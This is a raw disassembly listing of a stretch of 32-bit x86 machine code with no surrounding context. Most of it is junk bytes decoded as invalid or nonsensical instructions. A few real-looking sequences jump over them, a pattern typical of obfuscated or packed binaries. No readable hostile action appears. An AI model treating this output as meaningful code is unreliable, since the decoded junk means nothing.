  412ef6:	lds    edi,FWORD PTR [edi]
  412ef8:	(bad)  
  412ef9:	xor    esp,DWORD PTR [edi+0x3]
  412efc:	adc    al,0xff
  412efe:	in     eax,dx
  412eff:	mov    dl,BYTE PTR [ebx-0x3f]
  412f02:	sar    bl,cl
  412f04:	rcl    DWORD PTR [eax],0xb6
  412f07:	mov    al,ds:0xe892d805
  412f0c:	pop    ecx
  412f0d:	mov    ebp,DWORD PTR [ebx]
  412f0f:	inc    edx
  412f10:	mov    dl,0xb9
  412f12:	cmp    bh,bh
  412f14:	and    al,ch
  412f16:	sub    eax,0x9b34aecc
  412f1b:	sub    ah,BYTE PTR [di+0x492]
  412f20:	dec    ecx
  412f21:	outs   dx,BYTE PTR ds:[esi]
  412f22:	mov    DWORD PTR [ebp-0xc],eax
  412f25:	jmp    0x413001
  412f2a:	out    dx,eax
  412f2b:	imul   edi,DWORD PTR [ecx+0x13],0xfffffffd
  412f2f:	adc    ebp,edi
  412f31:	jmp    FWORD PTR [edi+ebp*2+0x12]
  412f35:	add    bh,BYTE PTR [ebp+0x19]
  412f38:	jo     0x412ed9
  412f3a:	push   ecx
  412f3b:	rol    BYTE PTR [eax],cl
  412f3d:	add    BYTE PTR [edi-0x1000000],bh
  412f43:	mov    ds:0xb06457b8,eax
  412f48:	fwait
  412f49:	push   ecx
  412f4a:	and    al,0x87
  412f4c:	mov    al,0x4b
  412f4e:	in     eax,0xf7
  412f50:	popa   
  412f51:	je     0x412f31
  412f53:	imul   esp,DWORD PTR [esi-0x7c],0x3a080a12
  412f5a:	fs enter 0x1805,0x27
  412f5f:	unpckhps xmm0,XMMWORD PTR [eax-0x7e]
  412f63:	out    0x30,eax
  412f65:	gs (bad) 
  412f67:	jge    0x412f4d
  412f69:	sbb    BYTE PTR [esi+0x68211785],ch
  412f6f:	fimul  DWORD PTR [ecx+0x23bcbfbe]
  412f75:	mov    bl,0x2c
  412f77:	retf   0x1ddb
  412f7a:	aad    0xae
  412f7c:	mov    cl,0xff
  412f7e:	jle    0x412f4c
  412f80:	popf   
  412f81:	adc    eax,0xa93f4d16
  412f86:	sbb    DWORD PTR [edx+0x46769cf7],ebp
  412f8c:	(bad)  
  412f8d:	(bad)  
  412f8e:	xlat   BYTE PTR ds:[ebx]
  412f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f90:	mov    ah,0x98
  412f92:	adc    BYTE PTR ds:0x7c5a9f77,dl
  412f98:	lock push ss
  412f9a:	xchg   edi,eax
  412f9b:	lds    ecx,FWORD PTR [ecx-0x34]
  412f9e:	pop    ds
  412f9f:	adc    al,0x84
  412fa1:	enter  0xca3,0x45
  412fa5:	bound  edx,QWORD PTR ds:0x8accaf44
  412fab:	je     0x412ff4
  412fad:	jmp    0xf44a:0xf7cfb9d6
  412fb4:	repz mov ch,0x2f
  412fb7:	or     eax,0xdab3f04a
  412fbc:	mov    eax,0x4524ec6d
  412fc1:	add    eax,0x8d6372fa
  412fc6:	dec    edi
  412fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fc8:	lock shl BYTE PTR [eax-0x37],1
  412fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fcd:	inc    edx
  412fce:	xor    al,0x94
  412fd0:	int    0x5c
  412fd2:	mov    bl,0xbe
  412fd4:	data16 sbb al,0x3c
  412fd7:	jae    0x412f7b
  412fd9:	sbb    al,0x18
  412fdb:	and    edx,DWORD PTR [eax-0x6633ff0]
  412fe1:	in     al,0xce
  412fe3:	pusha  
  412fe4:	call   0xc25db21b
  412fe9:	mov    bh,ch
  412feb:	leave  
  412fec:	and    bl,BYTE PTR [edx]
  412fee:	pusha  
  412fef:	icebp  
  412ff0:	ja     0x412f79
  412ff2:	(bad)  
  412ff4:	shl    DWORD PTR [ecx-0xdc89592],cl
  412ffa:	mov    cl,0x48
  412ffc:	clc    
  412ffd:	xor    eax,0x8b0de5d4
  413002:	inc    ebp
  413003:	hlt    
  413004:	pop    edi
  413005:	pop    esi
  413006:	jmp    0x4130e2
  41300b:	int3   
  41300c:	sub    DWORD PTR [ebx],edi
  41300e:	push   esp
  41300f:	call   DWORD PTR [esi-0x11]
  413012:	mov    ecx,0x3f361785
  413017:	sti    
  413018:	or     bh,ch
  41301a:	or     eax,0xd310
  41301f:	mov    edi,0x54000000
  413024:	mov    dl,BYTE PTR [edi-0x12]
  413027:	int    0x2
  413029:	xchg   BYTE PTR [ebx+eax*1+0x74960f8f],bl
  413030:	(bad)  
  413031:	jmp    0x1b0f:0xa20f4448
  413038:	mov    ds:0xe8c38e75,eax
  41303d:	and    BYTE PTR [edi-0x40],dh
  413040:	add    DWORD PTR [edi],ecx
  413042:	inc    ebx
  413043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413044:	call   0xa439d3e
  413049:	hlt    
  41304a:	mov    al,ds:0x3ff6361d
  41304f:	pop    ebx
  413050:	sahf   
  413051:	mov    ebp,0x78ef964
  413056:	stos   DWORD PTR es:[edi],eax
  413057:	lods   eax,DWORD PTR ds:[esi]
  413058:	leave  
  413059:	cli    
  41305a:	inc    edx
  41305b:	into   
  41305c:	push   esp
  41305d:	mov    eax,ds:0x43d8b79b
  413062:	dec    esi
  413063:	cmc    
  413064:	mov    eax,ds:0x845d1158
  413069:	sahf   
  41306a:	mov    edi,0x35a44ddb
  41306f:	push   esi
  413070:	sub    ch,BYTE PTR [eax]
  413072:	enter  0xbfd7,0xba
  413076:	nop
  413077:	ds add al,0x73
  41307a:	addr16 dec ebx
  41307c:	dec    esi
  41307d:	cmp    bl,0x82
  413080:	jmp    0x11dea57d
  413085:	jbe    0x4130e4
  413087:	cmp    ebp,esp
  413089:	dec    edx
  41308a:	and    DWORD PTR [ebp+0xb342636],eax
  413090:	push   esi
  413091:	imul   esi,DWORD PTR [edx+edi*8],0xffffffa7
  413095:	push   ebx
  413096:	jb     0x4130cc
  413098:	stos   DWORD PTR es:[edi],eax
  413099:	push   esi
  41309a:	iret   
  41309b:	mov    dh,0xcb
  41309d:	or     eax,0x136fbedf
  4130a2:	repnz retf 0x3c3b
  4130a6:	in     eax,dx
  4130a7:	fs cli 
  4130a9:	mov    bl,0x8
  4130ab:	aad    0xc5
  4130ad:	rcr    ah,cl
  4130af:	xchg   ebx,eax
  4130b0:	xchg   edx,eax
  4130b1:	push   eax
  4130b2:	call   0xe1cf:0x84aa1a8e
  4130b9:	sbb    eax,0xd2d84b
  4130be:	ror    ah,0xf0
  4130c1:	ins    DWORD PTR es:[edi],dx
  4130c2:	push   edi
  4130c3:	(bad)  
  4130c4:	dec    eax
  4130c5:	or     al,0x4a
  4130c7:	xor    DWORD PTR [esi+0x24],eax
  4130ca:	push   cs
  4130cb:	pop    ebx
  4130cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130cd:	sub    eax,0x27e9e391
  4130d2:	ds into 
  4130d4:	push   ecx
  4130d5:	out    dx,eax
  4130d6:	arpl   WORD PTR [di-0x5f],cx
  4130da:	ins    DWORD PTR es:[edi],dx
  4130db:	adc    esp,DWORD PTR [ebx]
  4130dd:	test   DWORD PTR [esi+0x5b29eea6],ecx
  4130e3:	leave  
  4130e4:	ret    0x10
  4130e7:	push   ebp
  4130e8:	mov    ebp,esp
  4130ea:	sub    esp,0xd0
  4130f0:	jmp    0x4131bb
  4130f5:	mov    al,0x34
  4130f7:	and    al,0x8c
  4130f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130fa:	pushf  
  4130fb:	mov    eax,0x8e9d143c
  413100:	imul   ecx,ebp,0xcf708c32
  413106:	rol    DWORD PTR [eax],cl
  413108:	add    BYTE PTR [esi-0x16000000],ch
  41310e:	xor    ebp,ebx
  413110:	cmp    esi,DWORD PTR [edx+eax*2+0x57a2835c]
  413117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413118:	mov    ds:0x9a0b9ec9,al
  41311d:	in     eax,0x8f
  41311f:	fsub   st,st(1)
  413121:	mov    bh,0x96
  413123:	sub    edi,DWORD PTR [esi-0x64]
  413126:	add    al,0xc5
  413128:	scas   eax,DWORD PTR es:[edi]
  413129:	test   DWORD PTR [ecx+0x1d0ad3aa],ebx
  41312f:	mov    ch,0x37
  413131:	pop    ss
  413132:	jae    0x4130f9
  413134:	jmp    0x765baed2
  413139:	adc    ah,BYTE PTR [edi+0x5755a897]
  41313f:	add    ah,BYTE PTR [esi]
  413141:	es jg  0x413100
  413144:	aam    0x13
  413146:	xchg   BYTE PTR [esi-0x2ab51f0f],ch
  41314c:	and    DWORD PTR [edi],edi
  41314e:	mov    ecx,0x949e41c1
  413153:	pop    edi
  413154:	fimul  DWORD PTR [edi+edi*8]
  413157:	icebp  
  413158:	dec    ebx
  413159:	jns    0x413120
  41315b:	xor    eax,0x90150613
  413160:	sub    bh,bh
  413162:	jno    0x4131db
  413164:	mov    esi,esi
  413166:	std    
  413167:	leave  
  413168:	xor    eax,0x86b6be93
  41316d:	mov    ecx,0x37b40de
  413172:	es adc ch,al
  413175:	sar    BYTE PTR [ebx-0x1456480b],cl
  41317b:	stos   DWORD PTR es:[edi],eax
  41317c:	jns    0x4131ee
  41317e:	or     edi,0x18
  413181:	shr    BYTE PTR [esi],cl
  413183:	jg     0x413107
  413185:	and    eax,0xcbfb4ad9
  41318a:	xchg   ebp,eax
  41318b:	or     esp,DWORD PTR [edi+0xe00335d]
  413191:	cmp    al,0x39
  413193:	stc    
  413194:	mov    ds:0xbe812f33,eax
  413199:	pop    ebx
  41319a:	fdivr  DWORD PTR [edi+0x1ebb0123]
  4131a0:	dec    ebp
  4131a1:	in     al,0xd3
  4131a3:	xchg   edx,eax
  4131a4:	sub    ebp,DWORD PTR [ebx]
  4131a6:	xor    eax,0x2186e7ba
  4131ab:	xchg   DWORD PTR [esi-0xf8cb1a0],eax
  4131b1:	add    DWORD PTR [edi-0x6b],edx
  4131b4:	shr    BYTE PTR [esi-0x32],0x85
  4131b8:	je     0x4131aa
  4131ba:	stos   DWORD PTR es:[edi],eax
  4131bb:	push   esi
  4131bc:	mov    DWORD PTR [ebp-0x8],0x1db7
  4131c3:	mov    DWORD PTR [ebp-0xc],0x529
  4131ca:	mov    DWORD PTR [ebp-0x4],0x68d9
  4131d1:	jmp    0x41329c
  4131d6:	shr    dl,1
  4131d8:	xor    DWORD PTR [ebx+edi*1],eax
  4131db:	fcomip st,st(5)
  4131dd:	(bad)  
  4131de:	jae    0x413255
  4131e0:	ret    0x2dcd
  4131e3:	mov    edi,0xd47d9554
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	scas   al,BYTE PTR es:[edi]
  4131eb:	add    BYTE PTR [eax],al
  4131ed:	add    BYTE PTR [eax+0x69caf49d],dh
  4131f3:	sub    ecx,DWORD PTR fs:[ebx]
  4131f6:	ds cli 
  4131f8:	cmp    ebp,DWORD PTR [ebp-0x5cbdd790]
  4131fe:	sahf   
  4131ff:	in     eax,0x1f
  413201:	(bad)  
  413203:	mov    ah,0x23
  413205:	xor    bh,dl
  413207:	adc    eax,0x209475e2
  41320c:	nop
  41320d:	or     ebp,DWORD PTR ds:0xebb58c7f
  413213:	rcr    esp,1
  413215:	adc    al,0x5a
  413217:	xor    al,0xd0
  413219:	adc    al,0xaa
  41321b:	jp     0x413290
  41321d:	and    BYTE PTR [eax+eiz*2+0x6f97e4f6],0xfd
  413225:	repnz ds repnz inc esp
  413229:	adc    BYTE PTR [ebx],al
  41322b:	jl     0x41320b
  41322d:	xchg   ebx,eax
  41322e:	sub    BYTE PTR [ebx+eax*4],al
  413231:	mov    WORD PTR [edx+ebx*1+0x4baea4d5],fs
  413238:	std    
  413239:	or     DWORD PTR [ecx-0x786ba153],0xffffffbf
  413240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413241:	out    0x9e,eax
  413243:	jge    0x4131ea
  413245:	and    edx,DWORD PTR [edx-0x631c297e]
  41324b:	hlt    
  41324c:	call   DWORD PTR [ebx+0x26]
  41324f:	inc    eax
  413250:	test   DWORD PTR [ebx-0x7150cd0b],0xf078110e
  41325a:	jb     0x413278
  41325c:	pop    ss
  41325d:	rol    BYTE PTR [edi-0x34daef0],1
  413263:	shl    DWORD PTR [eax-0x55],cl
  413266:	xchg   esp,eax
  413267:	retf   
  413268:	xor    eax,0xa8a20c62
  41326d:	xchg   DWORD PTR [eax],eax
  41326f:	xchg   esi,eax
  413270:	jae    0x41326e
  413272:	stos   BYTE PTR es:[edi],al
  413273:	sahf   
  413274:	sub    al,0x24
  413276:	dec    ebp
  413277:	xor    DWORD PTR [ebp-0x442cd3a4],ebx
  41327d:	call   0x9486f298
  413282:	and    eax,DWORD PTR [ebp+0x2ff2c4e9]
  413288:	es enter 0xceb7,0x1d
  41328d:	jbe    0x413308
  41328f:	inc    ebp
  413290:	mov    dl,0x5e
  413292:	cmp    DWORD PTR [ebp+eiz*8+0x5f0c112a],0xffffff87
  41329a:	and    DWORD PTR [ebp-0x1603ba75],ebx
  4132a0:	mov    BYTE PTR [eax],0x0
  4132a3:	add    BYTE PTR [eax-0x14ee34ce],dl
  4132a9:	stc    
  4132aa:	fidiv  DWORD PTR [ebx+0x5f5f7077]
  4132b0:	cmp    eax,0x2b33fac9
  4132b5:	aad    0x0
  4132b7:	add    BYTE PTR [esi+0x55000000],ch
  4132bd:	(bad)  
  4132be:	pop    edx
  4132bf:	sub    BYTE PTR [eax+0x740c8d5e],bl
  4132c5:	jnp    0x413259
  4132c7:	or     al,0x70
  4132c9:	jp     0x413287
  4132cb:	pop    edi
  4132cc:	dec    ecx
  4132cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ce:	mov    bh,0xf5
  4132d0:	jo     0x413329
  4132d2:	or     al,0x2c
  4132d4:	xor    BYTE PTR [esi],dl
  4132d6:	shr    BYTE PTR [ebx],1
  4132d8:	add    eax,0x5a68be1c
  4132dd:	cmp    eax,0x108dcea6
  4132e2:	sub    cl,BYTE PTR [esi+edi*4-0x6f34bf8a]
  4132e9:	ror    DWORD PTR [ecx+0x761d5df3],cl
  4132ef:	mov    cl,0x2a
  4132f1:	out    dx,al
  4132f2:	pop    edx
  4132f3:	pushf  
  4132f4:	and    al,0xbc
  4132f6:	xchg   esi,eax
  4132f7:	xchg   ebx,eax
  4132f8:	pop    es
  4132f9:	pop    eax
  4132fa:	fwait
  4132fb:	into   
  4132fc:	test   BYTE PTR [edi-0x741af7e6],ah
  413302:	(bad)  
  413303:	outs   dx,BYTE PTR ds:[esi]
  413304:	mov    edx,0x2fcad274
  413309:	mov    esi,0xcafaf8b8
  41330e:	sub    al,0xb4
  413310:	fimul  WORD PTR [ebx-0x53]
  413313:	add    edx,edx
  413315:	clc    
  413316:	repnz pop edi
  413318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413319:	jl     0x413346
  41331b:	pop    eax
  41331c:	repz ja 0x413338
  41331f:	jns    0x413301
  413321:	mov    esi,0x6dfef199
  413326:	aas    
  413327:	mov    eax,ds:0x3419481
  41332c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41332d:	inc    esp
  41332e:	call   0xfe79:0x4f538b7d
  413335:	fsub   DWORD PTR [ebp+0x6f]
  413338:	or     DWORD PTR [ebp+0x46],ebp
  41333b:	push   ebx
  41333c:	jge    0x4133bb
  41333e:	in     eax,0x2b
  413340:	cs cwde 
  413342:	mov    BYTE PTR [edi+ebx*2],dl
  413345:	dec    esi
  413346:	test   BYTE PTR [ecx],bh
  413348:	js     0x4133b3
  41334a:	scas   eax,DWORD PTR es:[edi]
  41334b:	jecxz  0x413353
  41334d:	pop    eax
  41334e:	sbb    BYTE PTR [eax+ebx*1],0x7a
  413352:	pop    esp
  413353:	int3   
  413354:	inc    ecx
  413355:	xor    dh,BYTE PTR [edx]
  413357:	popa   
  413358:	sub    DWORD PTR [ecx+0x44],ecx
  41335b:	adc    BYTE PTR [esi+0x273c81b2],bh
  413361:	stos   DWORD PTR es:[edi],eax
  413362:	loop   0x4133df
  413364:	ret    
  413365:	test   DWORD PTR [edx+0x6af09dc5],edx
  41336b:	add    eax,0xf759d233
  413370:	icebp  
  413371:	mov    ecx,DWORD PTR [ebp-0xc]
  413374:	and    eax,ecx
  413376:	mov    ecx,DWORD PTR [ebp-0x8]
  413379:	imul   eax,ecx
  41337c:	jmp    0x413447
  413381:	into   
  413382:	jbe    0x4133ff
  413384:	mov    al,0xfb
  413386:	mov    ebp,0xd8fa7ecf
  41338b:	lahf   
  41338c:	dec    esi
  41338d:	ins    BYTE PTR es:[edi],dx
  41338e:	es cld 
  413390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413391:	(bad)  
  413393:	add    BYTE PTR [eax],al
  413395:	scas   al,BYTE PTR es:[edi]
  413396:	add    BYTE PTR [eax],al
  413398:	add    BYTE PTR [ecx+0x41],bh
  41339b:	mov    edx,DWORD PTR [eax+edi*8]
  41339e:	in     al,0x25
  4133a0:	popf   
  4133a1:	cdq    
  4133a2:	fild   QWORD PTR [edx+0x56]
  4133a5:	popa   
  4133a6:	dec    edx
  4133a7:	sbb    DWORD PTR [ebx+0x7f77ce36],esi
  4133ad:	adc    DWORD PTR [eax-0x7a],edx
  4133b0:	jmp    0x413337
  4133b2:	ins    BYTE PTR es:[edi],dx
  4133b3:	add    bl,BYTE PTR [edx+0x43b5a9bf]
  4133b9:	adc    esp,DWORD PTR [eax]
  4133bb:	mov    esi,DWORD PTR [ecx]
  4133bd:	push   ecx
  4133be:	xchg   bl,ah
  4133c0:	or     al,0xf2
  4133c2:	mov    edx,ecx
  4133c4:	int3   
  4133c5:	sbb    ch,dh
  4133c7:	into   
  4133c8:	inc    di
  4133ca:	and    al,0xf
  4133cc:	mov    eax,ds:0xb8eca38d
  4133d1:	mov    al,BYTE PTR es:[edi-0x6f4f4079]
  4133d8:	jo     0x4133e0
  4133da:	int3   
  4133db:	jp     0x413444
  4133dd:	lods   eax,DWORD PTR ds:[esi]
  4133de:	xchg   edx,eax
  4133df:	adc    esi,edi
  4133e1:	adc    ah,bh
  4133e3:	and    eax,0x80478eda
  4133e8:	inc    ebx
  4133e9:	push   ebp
  4133ea:	jp     0x41337a
  4133ec:	jae    0x4133c2
  4133ee:	jb     0x413439
  4133f0:	jle    0x4133b1
  4133f2:	inc    esi
  4133f3:	mov    al,BYTE PTR [edx-0x6682db40]
  4133f9:	mov    dh,0xda
  4133fb:	jp     0x413460
  4133fd:	xchg   ebp,eax
  4133fe:	rcl    ch,cl
  413400:	mov    ebx,0xc308c1dd
  413405:	mov    ebx,0xf0580ff0
  41340a:	xchg   edi,eax
  41340b:	enter  0x7edc,0x7a
  41340f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413410:	loopne 0x41347a
  413412:	cs fst st(7)
  413415:	mov    ebx,DWORD PTR [eax+0x28]
  413418:	out    dx,al
  413419:	stc    
  41341a:	fmul   DWORD PTR [esi-0x50bf16f]
  413420:	ret    0x4de
  413423:	pop    ebx
  413424:	mov    bh,0x29
  413426:	pop    ss
  413427:	xchg   DWORD PTR [ecx],ecx
  413429:	fisubr WORD PTR [esi-0x22caa0f7]
  41342f:	ins    DWORD PTR es:[edi],dx
  413430:	(bad)  [edx*8-0x5b003d08]
  413437:	mov    DWORD PTR [esi+ebp*2],esp
  41343a:	xchg   DWORD PTR [edi+0x70],ebx
  41343d:	mov    cl,0x2d
  41343f:	sbb    DWORD PTR [edx-0x3d7f2706],0xffffff8a
  413446:	jo     0x41347d
  413448:	cwde   
  413449:	cmp    BYTE PTR [ebx+0x0],0x3
  41344d:	add    eax,0x42f1b4
  413452:	mov    DWORD PTR [ebp-0x68],eax
  413455:	mov    DWORD PTR [ebp-0x4],0x458d
  41345c:	mov    DWORD PTR [ebp-0xc],0x7019
  413463:	mov    DWORD PTR [ebp-0x8],0x3dae
  41346a:	mov    eax,DWORD PTR [ebp-0x8]
  41346d:	mov    ecx,DWORD PTR [ebp-0xc]
  413470:	add    eax,0x4e7b
  413475:	or     eax,ecx
  413477:	mov    ecx,DWORD PTR [ebp-0x4]
  41347a:	lea    eax,[ebp+eax*1-0x60]
  41347e:	lea    eax,[eax+ecx*1-0x141c6]
  413485:	jmp    0x413550
  41348a:	pusha  
  41348b:	fwait
  41348c:	mov    eax,0x74effbec
  413491:	lahf   
  413492:	das    
  413493:	fstp   QWORD PTR [ecx-0x22]
  413496:	repnz loope 0x413471
  413499:	xchg   edx,eax
  41349a:	xchg   esi,edx
  41349c:	add    BYTE PTR [eax],al
  41349e:	scas   al,BYTE PTR es:[edi]
  41349f:	add    BYTE PTR [eax],al
  4134a1:	add    BYTE PTR [eax+0x5e],ch
  4134a4:	jle    0x4134b6
  4134a6:	(bad)  
  4134a7:	fcompp 
  4134a9:	ficomp DWORD PTR [ebp-0x7f]
  4134ac:	icebp  
  4134ad:	adc    bh,al
  4134af:	sahf   
  4134b0:	jg     0x41349e
  4134b2:	das    
  4134b3:	std    
  4134b4:	out    dx,eax
  4134b5:	adc    bh,0x7d
  4134b8:	sbb    BYTE PTR [esi],dl
  4134ba:	mul    BYTE PTR [esi+0x4801849f]
  4134c0:	xor    cl,al
  4134c2:	mov    bl,0xac
  4134c4:	xor    BYTE PTR [edx-0x44],bl
  4134c7:	mov    DWORD PTR [eax-0xbc52528],ebp
  4134cd:	dec    edi
  4134ce:	loop   0x413501
  4134d0:	pushf  
  4134d1:	xchg   esi,edx
  4134d3:	(bad)  
  4134d4:	push   ebx
  4134d5:	adc    eax,0x98706b10
  4134da:	dec    esi
  4134db:	jecxz  0x41346f
  4134dd:	loope  0x4134d4
  4134df:	ins    DWORD PTR es:[edi],dx
  4134e0:	inc    edi
  4134e1:	je     0x4134a7
  4134e3:	fwait
  4134e4:	rcl    eax,cl
  4134e6:	stos   DWORD PTR es:[edi],eax
  4134e7:	inc    edx
  4134e8:	fst    st(5)
  4134ea:	loopne 0x413496
  4134ec:	ss aam 0xfe
  4134ef:	mov    BYTE PTR [esi+0x3e3916c5],ah
  4134f5:	fiadd  WORD PTR [esi-0x35]
  4134f8:	jno    0x413524
  4134fa:	aad    0x7b
  4134fc:	call   0x4f30:0xb384b6ab
  413503:	ss xchg edi,eax
  413505:	inc    esi
  413506:	fs out dx,al
  413508:	mov    bh,BYTE PTR [ecx]
  41350a:	or     BYTE PTR [edx+0x3a],ah
  41350d:	push   ecx
  41350e:	shr    ch,1
  413510:	leave  
  413511:	stos   DWORD PTR es:[edi],eax
  413512:	push   ds
  413513:	cld    
  413514:	mov    ah,0x5f
  413516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413517:	add    eax,DWORD PTR [esi+esi*8+0xd8496cd]
  41351e:	mov    ecx,0x109c0786
  413523:	sbb    DWORD PTR [ebp+0x2fafa57d],ecx
  413529:	add    BYTE PTR [esi-0x35aa1c21],dl
  41352f:	jmp    0x288:0x17fc697e
  413536:	add    eax,0xfbb1c1bf
  41353b:	int3   
  41353c:	frstpm(287 only) 
  41353e:	jle    0x41355b
  413540:	mov    ah,0xb0
  413542:	aas    
  413543:	push   eax
  413544:	in     eax,0x39
  413546:	in     al,dx
  413547:	cmp    edx,DWORD PTR [edx]
  413549:	lods   al,BYTE PTR ds:[esi]
  41354a:	ror    BYTE PTR [ebx+0xc],0x4
  41354e:	mov    edx,0xd40d8b9d
  413553:	repnz inc edx
  413555:	add    BYTE PTR [ecx+0xc6e908],cl
  41355b:	add    BYTE PTR [eax],al
  41355d:	leave  
  41355e:	adc    DWORD PTR [ebx],ebx
  413560:	neg    ebx
  413562:	(bad)  
  413563:	in     eax,dx
  413564:	aas    
  413565:	adc    BYTE PTR [eax+0x3550ded4],bl
  41356b:	test   al,0xa1
  41356d:	xor    eax,0xae0000d7
  413572:	add    BYTE PTR [eax],al
  413574:	add    BYTE PTR ds:0x1971ac1e,bh
  41357a:	jns    0x413566
  41357c:	imul   ecx,DWORD PTR [esi+0x2175fd79],0x403fd32
  413586:	push   edx
  413587:	jnp    0x413553
  413589:	cmp    eax,0x48d164f5
  41358e:	push   ebp
  41358f:	(bad)  
  413590:	arpl   WORD PTR ds:0xa7a1fee8,cx
  413596:	rcr    DWORD PTR [ecx+0x69998817],cl
  41359c:	mov    ebp,0x4e238e16
  4135a1:	mov    DWORD PTR [esi+ebx*2],esp
  4135a4:	nop
  4135a5:	jmp    0x2f18bf24
  4135aa:	rol    BYTE PTR [edx-0x13],0x99
  4135ae:	jmp    0xe15d6eb4
  4135b3:	fimul  WORD PTR [eax-0x23]
  4135b6:	adc    eax,0xbccbb8d7
  4135bb:	enter  0xeac6,0x95
  4135bf:	cmc    
  4135c0:	shl    DWORD PTR [ebx-0x3],1
  4135c3:	mov    al,ds:0xfa0124b
  4135c8:	jl     0x4135c8
  4135ca:	sbb    al,0xf9
  4135cc:	and    dl,BYTE PTR [eax+0x4f]
  4135cf:	adc    DWORD PTR [eax-0x63],edx
  4135d2:	loop   0x4135d4
  4135d4:	cmp    al,0x2b
  4135d6:	jl     0x413577
  4135d8:	fild   WORD PTR [ebp-0x3fa3df88]
  4135de:	sbb    esi,DWORD PTR [eax+0x2f35556e]
  4135e4:	jge    0x413631
  4135e6:	iret   
  4135e7:	fisub  WORD PTR [ebx+0x216ceaaf]
  4135ed:	inc    ecx
  4135ee:	mov    bl,bh
  4135f0:	ja     0x413622
  4135f2:	cmp    eax,0x2b56f12e
  4135f7:	dec    esi
  4135f8:	jg     0x413655
  4135fa:	mov    ss,WORD PTR [eax]
  4135fc:	lods   eax,DWORD PTR ds:[esi]
  4135fd:	ins    DWORD PTR es:[edi],dx
  4135fe:	leave  
  4135ff:	jno    0x413584
  413601:	test   DWORD PTR [ecx+0x73b7e883],eax
  413607:	lds    edi,FWORD PTR [ebx+0x5d4e241e]
  41360d:	dec    esi
  41360e:	add    BYTE PTR [edx+0x72e1ebbe],0x93
  413615:	push   esp
  413616:	popf   
  413617:	or     ch,bl
  413619:	sub    esi,DWORD PTR [edx+0x4a22ba15]
  41361f:	fmul   DWORD PTR [esi+0x45c730d1]
  413625:	hlt    
  413626:	std    
  413627:	push   ds
  413628:	add    BYTE PTR [eax],al
  41362a:	mov    DWORD PTR [ebp-0x8],0x3cd6
  413631:	mov    eax,DWORD PTR [ebp-0x8]
  413634:	mov    ecx,DWORD PTR [ebp-0xc]
  413637:	add    eax,0x1ffb
  41363c:	or     eax,ecx
  41363e:	and    eax,0x2b8d
  413643:	mov    ecx,0x3a8d
  413648:	sub    ecx,eax
  41364a:	mov    DWORD PTR [ebp-0x64],ecx
  41364d:	mov    DWORD PTR [ebp-0x4],0x2def
  413654:	mov    DWORD PTR [ebp-0xc],0x2cdc
  41365b:	mov    DWORD PTR [ebp-0x8],0x10ae
  413662:	mov    eax,DWORD PTR [ebp-0x8]
  413665:	mov    ecx,DWORD PTR [ebp-0xc]
  413668:	or     eax,ecx
  41366a:	mov    ecx,DWORD PTR [ebp-0x4]
  41366d:	jmp    0x413738
  413672:	(bad)  
  413673:	es mov bl,0x50
  413676:	repz aad 0xf7
  413679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41367a:	nop
  41367b:	cmp    ch,BYTE PTR [ebx-0x6ebac841]
  413681:	int    0xe3
  413683:	xlat   BYTE PTR ds:[ebx]
  413684:	add    BYTE PTR [eax],al
  413686:	scas   al,BYTE PTR es:[edi]
  413687:	add    BYTE PTR [eax],al
  413689:	add    bh,dl
  41368b:	push   0x608beb35
  413690:	or     ah,dl
  413692:	xchg   BYTE PTR [eax],bh
  413694:	retf   
  413695:	dec    edx
  413696:	ror    dl,cl
  413698:	sub    edi,DWORD PTR [ebp-0x2b]
  41369b:	ins    DWORD PTR es:[edi],dx
  41369c:	xchg   ebp,eax
  41369d:	test   DWORD PTR [ecx+0x11],edi
  4136a0:	push   ebx
  4136a1:	push   edx
  4136a2:	jecxz  0x413720
  4136a4:	inc    ebx
  4136a5:	sub    cl,0x60
  4136a8:	ja     0x413649
  4136aa:	std    
  4136ab:	int    0x75
  4136ad:	jp     0x413717
  4136af:	ss jl  0x4136da
  4136b2:	inc    ebp
  4136b3:	mov    esp,0xf500dbef
  4136b8:	and    al,0x19
  4136ba:	and    dh,BYTE PTR [eax+0x1a9dbabf]
  4136c0:	std    
  4136c1:	(bad)  
  4136c3:	mov    ecx,0x88d64621
  4136c8:	iret   
  4136c9:	pop    esi
  4136ca:	mov    edx,0xa0e6e2c9
  4136cf:	fwait
  4136d0:	sbb    esp,ebx
  4136d2:	adc    DWORD PTR ds:0x8cc3f0c7,edx
  4136d8:	daa    
  4136d9:	add    eax,0x9f2cbae1
  4136de:	pop    esp
  4136df:	shl    dl,cl
  4136e1:	cdq    
  4136e2:	inc    edx
  4136e3:	into   
  4136e4:	dec    esi
  4136e5:	add    eax,DWORD PTR [edi+esi*1-0x3aae07f8]
  4136ec:	dec    esi
  4136ed:	xor    edi,DWORD PTR [eax-0x670273f7]
  4136f3:	mov    WORD PTR [ecx-0xd2c7bfa],?
  4136f9:	mov    dl,BYTE PTR [ebx+ebp*4-0x31bfe0db]
  413700:	mov    esi,0xe8b73ba7
  413705:	shr    dh,1
  413707:	mov    edi,0x1f59dfad
  41370c:	out    dx,eax
  41370d:	mov    WORD PTR [eax-0x30],ss
  413710:	mov    ecx,0x7862d397
  413715:	lods   eax,DWORD PTR ds:[esi]
  413716:	out    0x16,al
  413718:	in     eax,0x72
  41371a:	inc    esi
  41371b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41371c:	(bad)  
  41371d:	fcom   QWORD PTR [eax+0x77a057dd]
  413723:	jne    0x413731
  413725:	cmp    DWORD PTR [ebx],ebp
